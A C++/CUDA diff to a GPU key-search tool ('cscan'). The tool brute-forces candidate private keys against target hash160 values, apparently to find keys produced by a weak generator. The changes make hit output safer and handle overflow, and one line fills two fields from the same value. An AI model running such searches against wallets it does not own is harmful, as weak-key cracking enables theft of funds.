-        fprintf(stderr, "[cscan] pad~%llu  %.2f Mpads/s  batch %.1fs  eta %.1fh\n",
-                base + batchPads, rate / 1e6, batchDt, remain / rate / 3600);
+        double remain = double(totalCandidates - done);
+        fprintf(stderr, "[cscan] candidates=%llu/%llu  %.2f Mcand/s  batch %.1fs  eta %.1fh\n",
+                done, totalCandidates, rate / 1e6, batchDt, remain / rate / 3600);
+        if (hits > 1024) {
+            CUDA_CHECK(cudaMemset(dHits, 0, 1024 * sizeof(Hit)));
+            CUDA_CHECK(cudaDeviceSynchronize());
+            if (threads == 1) {
+                fprintf(stderr, "hit buffer overflow for one candidate; reduce -i or targets\n");
+                return 2;
+            }
+            batchThreads = std::max<ulong>(1, threads / 2);
+            fprintf(stderr, "[cscan] %u hits overflow buffer; retrying batch with %llu threads\n",
+                    hits, batchThreads);
+            continue;
+        }
         if (hits) {
-            uint n = hits < 1024 ? hits : 1024;
+            uint n = hits;
             std::vector<Hit> H(n);
             CUDA_CHECK(cudaMemcpy(H.data(), dHits, n * sizeof(Hit), cudaMemcpyDeviceToHost));
-            FILE *o = fopen(outF, "w");
+            fprintf(stderr, "[HIT] %u match(es); private material only in chmod 0600 output\n", n);
+            int outFd = open(outF, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
+            if (outFd >= 0 && fchmod(outFd, S_IRUSR | S_IWUSR) != 0) {
+                perror(outF);
+                close(outFd);
+                outFd = -1;
+            }
+            FILE *o = outFd >= 0 ? fdopen(outFd, "w") : nullptr;
+            if (!o) {
+                perror(outF);
+                if (outFd >= 0) close(outFd);
+                wipeHost(H.data(), H.size() * sizeof(Hit));
+                CUDA_CHECK(cudaMemset(dHits, 0, 1024 * sizeof(Hit)));
+                CUDA_CHECK(cudaDeviceSynchronize());
+                return 2;
+            }
             fprintf(o, "[\n");
             for (uint i = 0; i < n; i++) {
-                fprintf(stderr, "[HIT] pad=%u skip=%u idx=%u priv=", H[i].pad, H[i].skip, H[i].idx);
-                for (int j = 0; j < 32; j++) fprintf(stderr, "%02x", H[i].priv[j]);
-                fprintf(stderr, " h160=");
-                for (int j = 0; j < 20; j++) fprintf(stderr, "%02x", H[i].h160[j]);
-                fprintf(stderr, "\n");
-                fprintf(o, " {\"pad\": %u, \"skip\": %u, \"idx\": %u, \"priv\": \"", H[i].pad, H[i].skip, H[i].idx);
+                fprintf(o, " {\"pad\": %u, \"skip\": %u, \"chip_skip\": %u, \"mixer_skip\": %u, \"pre_terms_keypad_sessions\": %u, \"post_terms_keypad_sessions\": %u, \"idx\": %u, \"priv\": \"",
+                        H[i].pad, H[i].chipSkip, H[i].chipSkip, H[i].mixerSkip,
+                        H[i].preTermsSessions, H[i].postTermsSessions, H[i].idx);
                 for (int j = 0; j < 32; j++) fprintf(o, "%02x", H[i].priv[j]);
                 fprintf(o, "\", \"h160\": \"");
                 for (int j = 0; j < 20; j++) fprintf(o, "%02x", H[i].h160[j]);
                 fprintf(o, "\"}%s\n", i + 1 < n ? "," : "");
             }
             fprintf(o, "]\n");
-            fclose(o);
+            bool writeFailed = ferror(o) != 0;
+            if (fclose(o) != 0) writeFailed = true;
+            wipeHost(H.data(), H.size() * sizeof(Hit));
+            CUDA_CHECK(cudaMemset(dHits, 0, 1024 * sizeof(Hit)));
+            CUDA_CHECK(cudaDeviceSynchronize());
+            if (writeFailed) {
+                fprintf(stderr, "failed writing %s\n", outF);
+                return 2;
+            }
             fprintf(stderr, "[cscan] %u hit(s) -> %s\n", hits, outF);
             return 0;
         }
+        candidateStart += threads;
     }
-    fprintf(stderr, "[cscan] exhausted 2^32 x %u skip, no hit\n", skipMax);
+    fprintf(stderr, "[cscan] exhausted %llu candidates, no hit\n", totalCandidates);
     return 1;
 }
